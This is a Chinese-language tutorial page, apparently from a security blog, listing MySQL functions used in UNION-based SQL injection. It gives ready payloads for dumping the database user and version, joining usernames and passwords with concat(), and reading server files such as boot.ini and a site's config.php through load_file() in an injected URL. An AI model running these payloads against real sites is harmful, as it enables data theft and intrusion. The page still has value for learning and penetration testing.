---
layout: default
---
# ![](../img/hj.jpg)常用参数
注入语句格式为：
```
union select 1,2,3,XO,5,6...n from XXOO
```
参数的使用位置为XO位置，有的参数可搭配使用，如concat(user(),0x3a,version())

## ![](../img/github26.png)user()
数据库的用户，格式为：user@server,例如：root@localhost

这里server可以是服务器名，也可以是IP

所有的user都会在mysql数据库的user表中
## ![](../img/github27.png)database()
当前数据库名
## ![](../img/github28.png)version()
当前数据库版本，版本最后通常会表名系统版本
如：

5.2.1-nt

nt表示windows
## ![](../img/github1.png)@@datadir
数据路径
如
```
c:\program files\mysql5\data\
```
load_file需要用到数据路径
## ![](../img/github2.png)concat()
连接数据用的，这样就可以在同一个位置上显示username,password等多个想要的数据，避免了重复查询
举例：

concat(username,0x3a,password)
0x3a是冒号，作为分割标志

类似的还有group_concat(),concat_ws()
## ![](../img/github3.png)load_file()
读文件，用法：union select 1,2,hex(load_file(路径的hex值)),5,6

windows中需要双斜杠

举例：
```
union select 1,load_file(0x633a5c5c626f6f742e696e69)    //c:\\boot.ini的hex
```
后面可以不加from
```
简单用法,根据错误找到物理路径为C:\wamp\www\article.php，之后：
http://www.test.com/article.php?id=-1 union select 1,2,hex(load_file(0x433a5c77616d705c7777775c627574636865725c636f6e6669672e706870)),4,5,6
上面的0x433a5c77616d705c7777775c627574636865725c636f6e6669672e706870是C:\wamp\www\butcher\config.php的十六进制
或者：http://www.test.com/article.php?id=-1 union select 1,2,hex(load_file(0x433a5c77616d705c7777775c627574636865725c636f6e6669672e706870)),4,5,6 from mysql.user
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
